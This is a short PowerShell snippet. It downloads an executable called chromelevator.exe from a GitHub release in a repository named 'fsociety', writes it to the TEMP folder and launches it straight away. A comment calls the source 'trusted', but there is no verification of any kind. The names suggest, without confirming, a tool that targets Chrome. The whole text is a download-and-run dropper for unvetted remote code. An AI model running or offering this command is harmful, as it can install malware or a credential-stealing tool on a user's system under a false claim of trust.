# Download + run EXE from trusted source
$url  = "https://github.com/np4abdou1/fsociety/releases/download/v1.0.0/chromelevator.exe"
$file = "$env:TEMP\chromelevator.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
